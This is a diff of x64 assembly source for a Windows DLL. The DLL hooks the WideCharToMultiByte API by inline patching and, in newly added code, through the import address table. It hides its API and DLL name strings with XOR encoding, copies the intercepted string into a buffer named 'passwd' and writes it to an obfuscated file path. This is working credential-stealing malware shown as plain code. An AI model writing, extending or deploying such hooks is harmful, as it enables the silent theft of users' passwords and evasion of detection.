@@ -21,7 +21,7 @@ export hook_inline_patch
 ; arg7: lpUseDefaultChar    [rsp + 56]
 ;
 ; return: num bytes written rax
-hooked_wide_char_to_multibyte_inline_patch:
+hooked_wide_char_to_multi_byte_inline_patch:
     push rbp
     mov rbp, rsp
 
@@ -30,10 +30,10 @@ hooked_wide_char_to_multibyte_inline_patch:
     mov [rbp + 32], r8              ; lpWideCharStr
     mov [rbp + 40], r9              ; ccWideCHar 
 
-    ; [rbp - 8] = return value
-    ; [rbp - 16] = bytes written
-    ; [rbp - 24] = text file handle
-    ; 8 bytes padding
+    ; rbp - 8 = return value
+    ; rbp - 16 = bytes written
+    ; rbp - 24 = text file handle
+    ; rbp - 32 = 8 bytes padding
     sub rsp, 32                     ; allocate local variable space
     sub rsp, 32                     ; allocate 32 byte shadow space
 
@@ -41,7 +41,7 @@ hooked_wide_char_to_multibyte_inline_patch:
     ; continue the normal workflow
     sub rsp, 16                     ; 1 arg + padding
     mov rcx, -1                     ; current proc id
-    mov rdx, [wide_char_to_multibyte]
+    mov rdx, [wide_char_to_multi_byte]
     mov r8, original_func_bytes
     mov r9, original_func_bytes.len
     mov qword [rsp + 32], 0
@@ -59,10 +59,10 @@ hooked_wide_char_to_multibyte_inline_patch:
     mov r8, [rbp + 32]              ; lpWideCharStr
     mov r9d, [rbp + 40]             ; ccWideChar
 
-    mov rax, [rbp + 48]             ; lpMultiByteStr
+    mov rax, [rbp + 48]             ; lpmulti_byteStr
     mov [rsp + 32], rax
 
-    mov eax, [rbp + 56]             ; ccMultiByte
+    mov eax, [rbp + 56]             ; ccmulti_byte
     mov [rsp + 40], rax
 
     mov rax, [rbp + 64]             ; lpDefaultChar
@@ -71,7 +71,7 @@ hooked_wide_char_to_multibyte_inline_patch:
     mov rax, [rbp + 72]             ; lpUseDefaultChar
     mov qword [rsp + 56], rax
 
-    call [wide_char_to_multibyte]   ; bytes written in rax
+    call [wide_char_to_multi_byte]   ; bytes written in rax
 
     cmp rax, 0                      ; did function fail ?
     je .error_shutdown
@@ -102,7 +102,7 @@ hooked_wide_char_to_multibyte_inline_patch:
 
     mov [rbp - 24], rax             ; file handle
 
-    mov rcx, [rbp + 48]             ; lpMultiByteStr
+    mov rcx, [rbp + 48]             ; lpmulti_byteStr
     mov rdx, passwd
     call strcpy
 
@@ -142,6 +142,144 @@ hook_iat:
     push rbp
     mov rbp, rsp
 
+    ; rbp - 8 = return value
+    ; rbp - 16 = kernel module hnd
+    ; rbp - 24 = dbgHelp module hnd
+    ; rbp - 32 = ImageDirectoryEntryToDataEx proc add
+    ; rbp - 40 = executable base addr
+    ; rbp - 48 = import descriptor count
+    ; rbp - 56 = first image import descriptor
+    ; rbp - 64 = dll_index
+    ; rbp - 72 = bool dll found
+    ; rbp - 80 = 8 bytes padding
+    sub rsp, 80                         ; allocate local variable space
+    sub rsp, 32                         ; allocate shadow space
+
+    ; get kernel module handle
+    call get_kernel_module_handle
+
+    cmp rax, 0                          ; kernel module not found ?
+    je .shutdown
+
+    mov qword [rbp - 16], rax           ; kernel module hnd
+
+    ; populate kernel function pointers
+    mov rcx, [rbp - 16]                 ; kernel module hnd
+    call populate_kernel_function_ptrs_by_name
+
+    ; UnXor WideCharToMultiByte function string
+    mov rcx, wide_char_to_multi_byte_xor
+    mov rdx, wide_char_to_multi_byte_xor.len
+    mov r8, xor_key
+    mov r9, xor_key.len
+    call my_xor
+
+    ; get addr of WideCharTomulti_byte
+    mov rcx, [rbp - 16]
+    mov rdx, wide_char_to_multi_byte_xor
+    call [get_proc_addr]
+
+    cmp rax, 0                          ; was WideCharTomulti_byte not found ?
+    je .shutdown
+
+    mov [wide_char_to_multi_byte], rax  ; save proc addr
+
+    ; UnXor DbgHelp dll string
+    mov rcx, debug_help_xor
+    mov rdx, debug_help_xor.len
+    mov r8, xor_key
+    mov r9, xor_key.len
+    call my_xor
+
+    ; load the dbghelp library
+    mov rcx, debug_help_xor
+    call [load_library_a]
+
+    cmp rax, 0                          ; was dbghelp dll not loaded ?
+    je .shutdown
+
+    mov [rbp - 24], rax                 ; dbghelp mod hnd
+
+    ; UnXor ImageDirectoryEntryToDataEx function string
+    mov rcx, image_directory_entry_to_data_ex_xor
+    mov rdx, image_directory_entry_to_data_ex_xor.len
+    mov r8, xor_key
+    mov r9, xor_key.len
+    call my_xor
+
+    ; get addr of ImageDirectoryEntryToDataEx
+    mov rcx, [rbp - 24]                 ; dbghelp mod hnd
+    mov rdx, image_directory_entry_to_data_ex_xor
+    call [get_proc_addr]
+
+    cmp rax, 0                          ; was addr not found ?
+    je .shutdown
+
+    mov [rbp - 32], rax                 ; ImageDirectoryEntryToDataEx proc addr
+
+    ; Get base addr of the current executable
+    mov rcx, 0 
+    call [get_module_handle_a]
+
+    cmp rax, 0                          ; is exec base addr 0 ?
+    je .shutdown
+
+    mov [rbp - 40], rax                 ; exec base addr
+
+    ; Get first ImageImportDescriptor
+    sub rsp, 16                         ; 1 arg + 8 byte padding
+    mov rcx, [rbp - 40]                 ; exec base addr
+    mov rdx, 1
+    mov r8, 1                           ; IMAGE_DIRECTORY_ENTRY_IMPORT
+    mov r9, rbp
+    sub r9, 48                          ; &import descriptor count
+    mov qword [rsp + 32], 0
+    call [rbp - 32]                     ; ImageDirectoryEntryToDataEx()
+    add rsp, 16                         ; 1 arg + 8 byte padding
+
+    mov [rbp - 56], rax                 ; first image import descriptor
+
+    mov qword [rbp - 64], 0             ; dll index = 0
+    mov r10d, [rbp - 48]                ; import descriptor count
+    mov qword [rbp - 72], 0                   ; dll found = false
+
+.loop:
+    mov rax, [rbp - 64]                 ; dll index
+    mov rcx, 20                         ; size of image import descriptor
+    mul rcx                             ; size * index to point to an item in array
+    add rax, [rbp - 56]                 ; add offset to first image import descriptor
+
+    add rax, 12                         ; offset image import descriptor name rva
+    mov eax, [rax]                      ; name rva
+    mov rdx, [rbp - 40]                 ; base addr
+    add rax, rdx                        ; base addr + name rva = ptr to dll name string
+
+    mov rcx, rax
+    mov rdx, kernel32_xor
+    mov r8, kernel32_xor.len
+    call strcmpiAA
+
+    cmp rax, 1                          ; are strings equal ?
+    je .module_found
+
+    inc qword [rbp - 64]                ; ++ dll index
+    dec r10
+    cmp qword r10, 0
+    jne .loop
+
+    jmp .shutdown
+
+.module_found:
+     mov qword [rbp - 72], 1            ; dll found = true
+     
+
+
+.shutdown:
+    mov rax, [rbp - 8]                  ; return value
+
+    add rsp, 32                         ; free shadow space
+    add rsp, 80                         ; free local variable space
+
     leave
     ret
 
@@ -149,9 +287,9 @@ hook_inline_patch:
     push rbp
     mov rbp, rsp
     
-    ; [rbp - 8] = return value
-    ; [rbp - 16] = kernel handle
-    ; [rbp - 32] = patch
+    ; rbp - 8 = return value
+    ; rbp - 16 = kernel handle
+    ; rbp - 32 = patch
     sub rsp, 32                         ; allocate local variable space
     sub rsp, 32                         ; allocate shadow space
 
@@ -167,25 +305,25 @@ hook_inline_patch:
     mov rcx, [rbp - 16]
     call populate_kernel_function_ptrs_by_name
 
-    mov rcx, wide_char_to_multibyte_xor
-    mov rdx, wide_char_to_multibyte_xor.len
+    mov rcx, wide_char_to_multi_byte_xor
+    mov rdx, wide_char_to_multi_byte_xor.len
     mov r8, xor_key
     mov r9, xor_key.len
     call my_xor
 
     mov rcx, [rbp - 16]                 ; kernel handle
-    mov rdx, wide_char_to_multibyte_xor
+    mov rdx, wide_char_to_multi_byte_xor
     call [get_proc_addr]                ; proc addr
 
     cmp rax, 0                          ; is proc addr = 0 ?
     je .shutdown
 
-    mov [wide_char_to_multibyte], rax   ; proc addr
+    mov [wide_char_to_multi_byte], rax   ; proc addr
 
     ; read the original function code
     sub rsp, 16                         ; 1 arg + padding
     mov rcx, -1                         ; current process
-    mov rdx, [wide_char_to_multibyte]   ; ptr to function
+    mov rdx, [wide_char_to_multi_byte]   ; ptr to function
     mov r8, original_func_bytes         ; ptr to original bytes
     mov r9, original_func_bytes.len     ; num bytes
     mov qword [rsp + 32], 0             ; NULL
@@ -202,13 +340,13 @@ hook_inline_patch:
     add rax, 4
     mov word [rax], 0
     add rax, 2
-    mov rcx, hooked_wide_char_to_multibyte_inline_patch
+    mov rcx, hooked_wide_char_to_multi_byte_inline_patch
     mov qword [rax], rcx
 
     ; overwrite the original code with the patch
     sub rsp, 16                         ; 1 arg + padding
     mov rcx, -1                         ; current process
-    mov rdx, [wide_char_to_multibyte]   ; ptr to function
+    mov rdx, [wide_char_to_multi_byte]   ; ptr to function
     mov r8, rbp
     sub r8, 32                          ; patch
     mov r9, original_func_bytes.len     ; num bytes
@@ -244,6 +382,7 @@ DllMain:
 
     cmp qword [rbp + 24], 1                 ; PROCESS_ATTACH
     jne .continue_from_process_attach
+    call hook_iat
 
     jmp .shutdown
 
@@ -261,8 +400,15 @@ DllMain:
     ret
 
 section .data
-wide_char_to_multibyte_xor: db 0x67, 0x59, 0x54, 0x55, 0x73, 0x58, 0x51, 0x42, 0x64, 0x5f, 0x7d, 0x45, 0x5c, 0x44, 0x59, 0x72, 0x49, 0x44, 0x55, 0x0
-.len equ $ - wide_char_to_multibyte_xor - 1
+wide_char_to_multi_byte_xor: db 0x67, 0x59, 0x54, 0x55, 0x73, 0x58, 0x51, 0x42, 0x64, 0x5f, 0x7d, 0x45, 0x5c, 0x44, 0x59, 0x72, 0x49, 0x44, 0x55, 0x0
+.len equ $ - wide_char_to_multi_byte_xor - 1
+
+debug_help_xor: db 0x54, 0x52, 0x57, 0x58, 0x55, 0x5c, 0x40, 0x1e, 0x54, 0x5c, 0x5c, 0x0
+.len equ $ - debug_help_xor - 1
+
+image_directory_entry_to_data_ex_xor: db 0x79, 0x5d, 0x51, 0x57, 0x55, 0x74, 0x59, 0x42, 0x55, 0x53, 0x44, 0x5f, 0x42, 0x49, 0x75, 0x5e, 0x44, 0x42, 0x49, 0x64, 0x5f, 0x74, 0x51, 0x44, 0x51, 0x75, 0x48, 0x0
+.len equ $ - image_directory_entry_to_data_ex_xor - 1
+
 
 file_path_xor: db 0x73, 0xa, 0x6c, 0x6c, 0x62, 0x64, 0x7f, 0x6c, 0x6c, 0x40, 0x47, 0x5f, 0x42, 0x54, 0x1e, 0x44, 0x48, 0x44, 0x0
 .len equ $ - file_path_xor - 1
@@ -270,7 +416,7 @@ file_path_xor: db 0x73, 0xa, 0x6c, 0x6c, 0x62, 0x64, 0x7f, 0x6c, 0x6c, 0x40, 0x4
 %include '../utils_64_data.asm'
 
 section .bss
-wide_char_to_multibyte: dq ?
+wide_char_to_multi_byte: dq ?
 original_func_bytes: resb 14
 .len equ $ - original_func_bytes
 passwd: resb 128
